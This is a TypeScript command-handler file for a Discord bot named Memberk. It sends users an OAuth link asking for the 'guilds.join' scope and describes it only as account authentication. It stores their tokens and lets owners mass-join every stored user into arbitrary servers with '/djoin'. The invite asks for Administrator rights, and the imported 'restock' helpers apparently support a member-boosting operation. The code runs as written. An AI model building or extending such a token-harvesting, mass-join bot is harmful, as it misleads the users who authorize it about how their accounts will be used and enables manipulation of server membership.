import {
  ApplicationCommandOptionType,
  EmbedBuilder,
  REST,
  Routes,
  type ChatInputCommandInteraction,
  type RESTPostAPIApplicationCommandsJSONBody,
  type Client,
} from "discord.js";

import {
  BOT_TOKEN,
  CLIENT_ID,
  COLOR,
  MAIN_GUILD_ID,
  HARDCODED_OWNERS,
  SUPER_OWNER_ID,
  getRedirectUri,
} from "../config.js";
import { addAllowedGuild, isAllowedGuild, removeAllowedGuild } from "../storage/allowedGuilds.js";
import { addBlacklisted, isBlacklisted, removeBlacklisted } from "../storage/blacklist.js";
import { exchangeCode } from "../oauth.js";
import { saveUserAuth, readStoredTokens } from "../storage/tokens.js";
import * as E from "./embeds.js";
import { isAuthorizedMember } from "./permissions.js";
import { doCheckTokens, doMassJoin } from "./restock.js";
import type { BotState } from "./client.js";

const O = ApplicationCommandOptionType;

// ─── Slash command definitions ─────────────────────────────────────────────────

export function buildSlashDefinitions(): RESTPostAPIApplicationCommandsJSONBody[] {
  return [
    // Public
    { name: "get_token", description: "Get your OAuth verification link", type: 1 },
    { name: "count", description: "Show how many users are authenticated", type: 1 },
    { name: "list_users", description: "List all authenticated users", type: 1 },
    { name: "servers", description: "List all servers the bot is in", type: 1 },
    {
      name: "server_age",
      description: "Check how long the bot has been in a server",
      type: 1,
      options: [
        { name: "server_id", description: "Server ID (omit to list all)", type: O.String, required: false },
      ],
    },
    { name: "invite", description: "Get the bot invite link", type: 1 },
    { name: "help", description: "Show all available commands", type: 1 },

    // Owner
    {
      name: "auth",
      description: "Manually authenticate with an OAuth code (fallback)",
      type: 1,
      options: [
        { name: "code", description: "OAuth code from the auth link", type: O.String, required: true },
      ],
    },
    {
      name: "djoin",
      description: "Add all authenticated users to a server (owners only)",
      type: 1,
      options: [
        { name: "server_id", description: "Target server ID", type: O.String, required: true },
      ],
    },
    { name: "check_tokens", description: "Check and refresh all stored tokens (owners only)", type: 1 },

    // Super-owner
    {
      name: "blacklist",
      description: "Blacklist a user from using the bot (super-owner only)",
      type: 1,
      options: [
        { name: "user_id", description: "Discord user ID to blacklist", type: O.String, required: true },
      ],
    },
    {
      name: "unblacklist",
      description: "Remove a user from the blacklist (super-owner only)",
      type: 1,
      options: [
        { name: "user_id", description: "Discord user ID to unblacklist", type: O.String, required: true },
      ],
    },
    { name: "blacklist_list", description: "Show all blacklisted users (super-owner only)", type: 1 },
    {
      name: "enable_server",
      description: "Allow another server to use this bot (super-owner only)",
      type: 1,
      options: [
        { name: "server_id", description: "Guild ID to enable", type: O.String, required: true },
      ],
    },
    {
      name: "disable_server",
      description: "Disable a server from using this bot (super-owner only)",
      type: 1,
      options: [
        { name: "server_id", description: "Guild ID to disable", type: O.String, required: true },
      ],
    },
    { name: "list_allowed_servers", description: "List all allowed servers (super-owner only)", type: 1 },
  ];
}

export async function registerCommandsForGuild(guildId: string): Promise<void> {
  if (!BOT_TOKEN || !CLIENT_ID) return;
  const rest = new REST({ version: "10" }).setToken(BOT_TOKEN);
  const body = buildSlashDefinitions();
  try {
    await rest.put(Routes.applicationGuildCommands(CLIENT_ID, guildId), { body });
    console.log(`[commands] registered ${body.length} commands for guild ${guildId}`);
  } catch (e) {
    console.error(`[commands] failed to register for guild ${guildId}`, e);
  }
}

// ─── Guards ────────────────────────────────────────────────────────────────────

function isSuperOwner(userId: string): boolean {
  return userId === SUPER_OWNER_ID || HARDCODED_OWNERS.includes(userId);
}

async function ownerGuard(i: ChatInputCommandInteraction): Promise<boolean> {
  if (!i.guild) {
    await i.reply({ content: "❌ This command must be used inside a server.", ephemeral: true });
    return false;
  }
  const member = await i.guild.members.fetch(i.user.id).catch(() => null);
  if (isAuthorizedMember(i.guild.ownerId, i.guild.id, i.user.id, member)) return true;
  await i.reply({
    embeds: [new EmbedBuilder()
      .setTitle("❌ Access Denied")
      .setDescription("Only the **server owner** or a designated **owner** can use this command.")
      .setColor(COLOR.red)],
    ephemeral: true,
  });
  return false;
}

async function superOwnerGuard(i: ChatInputCommandInteraction): Promise<boolean> {
  if (isSuperOwner(i.user.id)) return true;
  await i.reply({
    embeds: [new EmbedBuilder()
      .setTitle("🔒 Private Command")
      .setDescription("This command can only be used by the **bot's super-owner**.")
      .setColor(COLOR.red)],
    ephemeral: true,
  });
  return false;
}

async function wrongGuildGuard(i: ChatInputCommandInteraction): Promise<boolean> {
  if (!i.guildId || (i.guildId !== MAIN_GUILD_ID && !isAllowedGuild(i.guildId))) {
    await i.reply({
      embeds: [new EmbedBuilder()
        .setTitle("🚫 Wrong Server")
        .setDescription(
          "Memberk bot commands **only work in the official Memberk server**.\n\n" +
          "🛡️ Any other server claiming to use this bot is a **scam** — do not trust it.",
        )
        .setColor(COLOR.red)],
      ephemeral: true,
    });
    return false;
  }
  return true;
}

async function blacklistGuard(i: ChatInputCommandInteraction): Promise<boolean> {
  if (isBlacklisted(i.user.id)) {
    await i.reply({
      embeds: [new EmbedBuilder()
        .setTitle("⛔ You Are Blacklisted")
        .setDescription("You have been **blacklisted** from using this bot.\n\nContact the super-owner if you think this is a mistake.")
        .setColor(COLOR.red)],
      ephemeral: true,
    });
    return false;
  }
  return true;
}

// ─── Command dispatch ─────────────────────────────────────────────────────────

export async function handleSlash(
  i: ChatInputCommandInteraction,
  state: BotState,
  client: Client,
): Promise<void> {
  if (!(await blacklistGuard(i))) return;
  if (!(await wrongGuildGuard(i))) return;

  const cmd = i.commandName;

  switch (cmd) {

    // ─── Public ─────────────────────────────────────────────────────────────

    case "get_token": {
      const params = new URLSearchParams({
        client_id: CLIENT_ID,
        response_type: "code",
        redirect_uri: getRedirectUri(),
        scope: "identify guilds.join",
        prompt: "consent",
      });
      const url = `https://discord.com/oauth2/authorize?${params.toString()}`;
      await i.reply({
        embeds: [new EmbedBuilder()
          .setTitle("🔐 Authentication Required")
          .setDescription("Click the link below to authenticate your Discord account:")
          .setColor(COLOR.blurple)
          .addFields(
            { name: "🔗 Auth Link", value: `[👉 Click here to authenticate](${url})`, inline: false },
            { name: "ℹ️ What happens?", value: "You'll authorize the app on Discord. Your token is saved **automatically** — no code pasting needed.", inline: false },
          )
          .setFooter({ text: "Memberk • Authorization" })
          .setTimestamp()],
        ephemeral: true,
      });
      return;
    }

    case "count": {
      const n = readStoredTokens().length;
      await i.reply({
        embeds: [new EmbedBuilder()
          .setTitle("📊 Authenticated Users")
          .setDescription(`There are currently **${n}** authenticated user(s).`)
          .setColor(COLOR.blurple)
          .setTimestamp()],
      });
      return;
    }

    case "list_users": {
      await i.reply({ embeds: [E.listUsersEmbed()] });
      return;
    }

    case "servers": {
      await i.reply({ embeds: [E.serversEmbed(client, state.serverJoinTimes)] });
      return;
    }

    case "server_age": {
      const sid = i.options.getString("server_id");
      await i.reply({ embeds: [E.serverAgeEmbed(sid, client, state.serverJoinTimes)] });
      return;
    }

    case "invite": {
      const url = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&permissions=8&scope=bot%20applications.commands`;
      await i.reply({
        embeds: [new EmbedBuilder()
          .setTitle("🤖 Bot Invite Link")
          .setDescription(
            `[👉 Click here to add the bot to a server](${url})\n\n` +
            `⚠️ The bot automatically **leaves servers after 14 days** (except the main server).`,
          )
          .setColor(COLOR.blurple)
          .setTimestamp()],
      });
      return;
    }

    case "help": {
      await i.reply({ embeds: [E.helpEmbed()], ephemeral: true });
      return;
    }

    // ─── Owner ───────────────────────────────────────────────────────────────

    case "auth": {
      const code = i.options.getString("code", true);
      await i.deferReply({ ephemeral: true });
      const res = await exchangeCode(code.trim());
      if (!res.ok) {
        await i.editReply({
          content:
            `❌ Auth failed: ${res.error}\n\n**Common causes:**\n` +
            `• Code expired — use \`/get_token\` to get a fresh link\n` +
            `• Code already used (each code works once only)\n` +
            `• Redirect URI mismatch in bot config`,
        });
        return;
      }
      const { access_token, refresh_token } = res.data;
      saveUserAuth(i.user.id, access_token, refresh_token);
      i.user.send({
        embeds: [new EmbedBuilder()
          .setTitle("✅ You're Authenticated!")
          .setDescription("Your token has been saved. You can now be joined to servers using `/djoin`.")
          .setColor(COLOR.green)
          .setTimestamp()],
      }).catch(() => {});
      await i.editReply({ content: "✅ Authenticated successfully." });
      return;
    }

    case "djoin": {
      if (!(await ownerGuard(i))) return;
      const serverId = i.options.getString("server_id", true).trim();
      if (!/^\d+$/.test(serverId)) {
        await i.reply({ content: "❌ Invalid server ID — must be a numeric Discord server ID.", ephemeral: true });
        return;
      }
      const guild = client.guilds.cache.get(serverId);
      if (!guild) {
        const inviteUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&permissions=8&scope=bot%20applications.commands`;
        await i.reply({
          embeds: [new EmbedBuilder()
            .setTitle("❌ Bot Not in Server")
            .setDescription(
              `Bot is not in server \`${serverId}\`.\n\n` +
              `[Add the bot to that server first](${inviteUrl}), then run \`/djoin\` again.`,
            )
            .setColor(COLOR.red)],
          ephemeral: true,
        });
        return;
      }
      const users = readStoredTokens();
      if (users.length === 0) {
        await i.reply({
          embeds: [new EmbedBuilder()
            .setTitle("📭 No Authenticated Users")
            .setDescription("No users have authenticated yet.\n\nShare `/get_token` so members can authorize their accounts.")
            .setColor(COLOR.yellow)],
          ephemeral: true,
        });
        return;
      }
      await i.deferReply({ ephemeral: true });
      const statusMsg = await i.followUp({
        content: `🚀 **Mass join started** — adding **${users.length}** user(s) to **${guild.name}**…`,
        ephemeral: true,
      });
      const result = await doMassJoin(serverId, client, async (text) => {
        await statusMsg.edit(text).catch(() => {});
      });
      if (result) {
        await i.editReply({ embeds: [result] });
      }
      return;
    }

    case "check_tokens": {
      if (!(await ownerGuard(i))) return;
      await i.deferReply({ ephemeral: true });
      await i.editReply({ embeds: [await doCheckTokens()] });
      return;
    }

    // ─── Super-owner ─────────────────────────────────────────────────────────

    case "blacklist": {
      if (!(await superOwnerGuard(i))) return;
      const uid = i.options.getString("user_id", true).trim();
      if (!/^\d{5,25}$/.test(uid)) {
        await i.reply({ content: "❌ That doesn't look like a valid Discord user ID.", ephemeral: true });
        return;
      }
      if (isSuperOwner(uid)) {
        await i.reply({ content: "❌ You can't blacklist an owner.", ephemeral: true });
        return;
      }
      const added = addBlacklisted(uid);
      await i.reply({
        content: added
          ? `⛔ <@${uid}> (\`${uid}\`) has been **blacklisted**.`
          : `ℹ️ <@${uid}> is already blacklisted.`,
        ephemeral: true,
      });
      return;
    }

    case "unblacklist": {
      if (!(await superOwnerGuard(i))) return;
      const uid = i.options.getString("user_id", true).trim();
      const removed = removeBlacklisted(uid);
      await i.reply({
        content: removed
          ? `✅ <@${uid}> (\`${uid}\`) has been **unblacklisted**.`
          : `ℹ️ <@${uid}> was not on the blacklist.`,
        ephemeral: true,
      });
      return;
    }

    case "blacklist_list": {
      if (!(await superOwnerGuard(i))) return;
      await i.reply({ embeds: [E.blacklistListEmbed()], ephemeral: true });
      return;
    }

    case "enable_server": {
      if (!(await superOwnerGuard(i))) return;
      const sid = i.options.getString("server_id", true).trim();
      if (!/^\d{5,25}$/.test(sid)) {
        await i.reply({ content: "❌ That doesn't look like a valid server ID.", ephemeral: true });
        return;
      }
      if (sid === MAIN_GUILD_ID) {
        await i.reply({ content: "ℹ️ The main server is always allowed.", ephemeral: true });
        return;
      }
      const added = addAllowedGuild(sid);
      if (client.guilds.cache.has(sid)) {
        await registerCommandsForGuild(sid).catch(() => {});
      }
      await i.reply({
        content: added
          ? `✅ Server \`${sid}\` is now **allowed** to use this bot.`
          : `ℹ️ Server \`${sid}\` was already allowed.`,
        ephemeral: true,
      });
      return;
    }

    case "disable_server": {
      if (!(await superOwnerGuard(i))) return;
      const sid = i.options.getString("server_id", true).trim();
      if (sid === MAIN_GUILD_ID) {
        await i.reply({ content: "❌ You can't disable the main server.", ephemeral: true });
        return;
      }
      const removed = removeAllowedGuild(sid);
      await i.reply({
        content: removed
          ? `✅ Server \`${sid}\` is no longer allowed to use this bot.`
          : `ℹ️ Server \`${sid}\` was not in the allowed list.`,
        ephemeral: true,
      });
      return;
    }

    case "list_allowed_servers": {
      if (!(await superOwnerGuard(i))) return;
      await i.reply({ embeds: [E.allowedGuildsEmbed(MAIN_GUILD_ID)], ephemeral: true });
      return;
    }

    default:
      await i.reply({ content: `❌ Unknown command: \`${cmd}\``, ephemeral: true });
  }
}
